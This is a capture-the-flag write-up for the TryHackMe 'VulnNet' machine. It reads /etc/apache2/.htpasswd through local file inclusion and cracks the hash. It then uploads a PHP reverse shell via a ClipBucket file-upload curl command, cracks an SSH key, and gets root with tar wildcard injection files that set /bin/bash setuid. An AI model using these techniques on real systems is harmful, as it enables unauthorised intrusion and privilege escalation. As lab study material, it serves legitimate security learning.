# VulnNet

## nmap

```sql
└─$ nmap -sC -sV -oN nmap 10.10.116.140
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 12:30 IST
Nmap scan report for vulnnet.thm (10.10.116.140)
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.69 seconds
```


## web

![[Pasted image 20210526110808.png]]

after looking around the url showed `?` at the end so there could be a possibility for lfi.

Looking at the source code of javascript we got the word.

![[Pasted image 20210526112003.png]]

and checking we do have lfi 

![[Pasted image 20210526112100.png]]

Also a vhost 
![[Pasted image 20210526112557.png]]

![[Pasted image 20210526112647.png]]

and there is a .htaccess  or .htpasswd file we can access.

view-source:http://vulnnet.thm/index.php?referer=/etc/apache2/apache2.conf

![[Pasted image 20210526113154.png]]

we cant read the .htpasswd but can read the .htpasswd

view-source:http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd

![[Pasted image 20210526113514.png]]

`developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0`

cracking the hashid using hashcat 

![[Pasted image 20210526114730.png]]

`developers:9972761drmfsls`

and we can signin in http://broadcast.vulnnet.thm/

![[Pasted image 20210526114849.png]]

## exploit 

here ClipBucket is being used and its v4.0

![[Pasted image 20210526115455.png]]

and there are public exploit available for file upload

https://www.exploit-db.com/exploits/44250

https://www.rapid7.com/db/modules/exploit/multi/http/clipbucket_fileupload_exec/


trying to upload we get unauthorized so using user access

![[Pasted image 20210526123936.png]]

and uploaded the file
`curl -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php" -u "developers:9972761drmfsls"`

![[Pasted image 20210526124028.png]]

from the source code we see that there is a folder called file and from ther we can call the shell(php code)

![[Pasted image 20210526124822.png]]  
and we got the shell as www-data
![[Pasted image 20210526124847.png]]

## user

from /var/backups we got a ssh-backup 

and it have id_rsa file but protected

![[Pasted image 20210526125831.png]]

using ssh2john
`python2 /usr/share/john/ssh2john.py id_rsa`

```
id_rsa:$sshng$1$16$6CE1A97A7DAB4829FE59CC561FB2CCC4$1200$99114344bd79b7baaf699c491870c9b1ec27869ef01126c41b17805ad0ab6de21525b40841df19f122b3a6f4cc14bb6d76c7aab06b6df074abb9522afbe3c5a5746b0431b9178ad6e41e950ce54c9353bd278787115d0dedeb3e859db6a367bdeb4aaa8fb624498f63563e4daaae3db943548341b4aa75a1f0ceabf2bf373aff87b8285d78d0b9082d8ebad362be5ee376621a151155c2658d254c957a7d4560c6b113e3688dcc2c1cc1fc695d854e2b8c52cba03b065c30a86244f4c49688e7b43ae580d3273fa94c910eb2c89103345b67eed4f197bb6a7422200776984195c07e941b6df2439ecf44719124124ae986ce4b8b6d0d6d9c6bb48e953eaebfcc3535081772d294f9f1e57236d0dfad43ddbe2c835216ad3c0091db40538ea5a0dc161e0339c3174322817fc0a8b7fcbc0d876e7453616412c449c01e69d520a68d54174bea3a609b0e118c6cec51cb648c1ea48e99cf49eb2ee2549eea7fdfe49d196ce7445ef0c13a9bb7b1c26f31349defa4b89f856636019d6e93656b28f9e6e25f8a4191e7e0b491ce8fcad8e166b9ce0d119f6e696a87da20816a5f945526f078063b09fa9df88704d343d296b4afc104d6629410f8f7c9f8cb856e8f70cd8e1841c70d0add2c3cb7958457e0db02452a36e23b60375f9a41c78d15743bbfc46b7eee5299bbaaded063560216c6894ccbe6b5e3948cd489dec31e15e025f58e493ab29d2af61dc3d37058c598f39ff80c47f70d8188e86db6081184bd2a36521d3b9c3c0350c61532e7340a91beb5ca6b0847c3beee91d379179e94f0ea9efec503feb94b2df14945cf9fd9e1a96ab4f849e12e9a23712b7a733c97ed96b664d3ff2da157a478f063106098c91fa1598b998af0ea93ab2c76fb0b91ba791e83fd6c118e13e9ba10965a7cfe3410d05c8c14cf342f0321f26fb0f5f88b6731eb05f8bf73b9400319eb85975d9d2da85aa4ce59b8a511c27cd6f7e4709a6252b93d009cde4ecae26dc1f4739e3c99edfe4d3fdbbabc5d0d40761923b316707ecf010b064f0df1cc19897487c5ef50e61b4aeaa8247bb01d9bba1a08e2f7b7a1bbe99a0d82bc4fab9c64b7c31b9a10ed265b156b498896762ecb259be9a70445db7027358353782c3871bbef08151d84abe16aed35c955b637f47c078de4e46f6a6de35498864896d2596b11e742924621bc05488b62878f45cabdbd9d444a6496f225b6f8f87cb664d3789bf71f3cd982146fb0d00efc8953eb933c5d5ae4da04e281b2dce9bcb040db4778a37a30c02ea3f7c4e598550e2a7e642665f511000726637011134a166370807aa0c1837322119135dca8a89c41aec8558d193d1921191edc8636806a7acc9983c62db182051a9a59150995ba61824657ce181f703dc026bde0b418d7d3ca03d0944312868cf899322fa9c0b05a26d7304da0f0cf4d7d52aceccd201b95dbf7730b6be413ed3ca3127e9b0dad353b6fa2397931d2c70a32ce2fdd80626188531ce926239397d0656bbf1295c8225663595d55fbbee8b120b10994bc6f6b6303b8f85696e1c237c77d7ea83af5b4224c2ee3e97eccab6b2041eddba3fd8e007164d6a58f9f79a1e20d4fdb424eba481a96f1639b77dbf1953837c680dc2e36a10c0c2d048e084ef1cd3e9fa10c4a9e45609994a9b8956c88f38d0814c4e556ac26c550ea
```

using hashcat to crack it mode(22931)
`hashcat -m 22931 hash /usr/share/wordlists/rockyou.txt`

![[Pasted image 20210526131241.png]]

`server-management:oneTWO3gOyac`

![[Pasted image 20210526131426.png]]

flag 1 == THM{907e420d979d8e2992f3d7e16bee1e8b}

## Root

running linpeas we get a file from /var/opt/backupsrv.sh which backups all the files in /home/server-management/Documents/ folders 

```bash
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

here we can exploit the wildcard using the 3rd method(Tar Wildcard Injection) from
: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/


```
echo "chmod u+s /bin/bash" > test.sh 
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
```

![[Pasted image 20210526140139.png]]

run the script using `bash backupsrv.sh`


![[Pasted image 20210526134720.png]]

![[Pasted image 20210526140118.png]]

root flag == THM{220b671dd8adc301b34c2738ee8295ba}